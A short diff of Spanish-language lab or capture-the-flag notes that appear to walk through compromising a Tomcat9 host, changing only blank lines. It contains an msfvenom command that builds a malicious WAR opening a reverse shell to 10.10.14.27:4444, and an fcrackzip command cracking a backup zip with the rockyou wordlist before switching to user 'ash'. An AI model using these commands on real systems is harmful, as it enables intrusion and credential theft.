@@ -15,6 +15,7 @@ Estructura de directorios tomcat9
  * https://packages.ubuntu.com/en/focal/all/tomcat9/filelist
 Shell reversa mediante carga de war maliciosa (msfvenon)
  * msfvenom -p java/shell_reverse_tcp lhost=10.10.14.27 lport=4444 -f war -o shell.war
+ 
 --------------------------
 User
 --------------------------
@@ -24,8 +25,8 @@ Obteniendo credenciales de usuario "ash"
 
 #fcrackzip -D -p /usr/share/wordlists/rockyou.txt -v 16162020_backup.zip
 
-
 #su ash
+
 --------------------------
 Root
 --------------------------
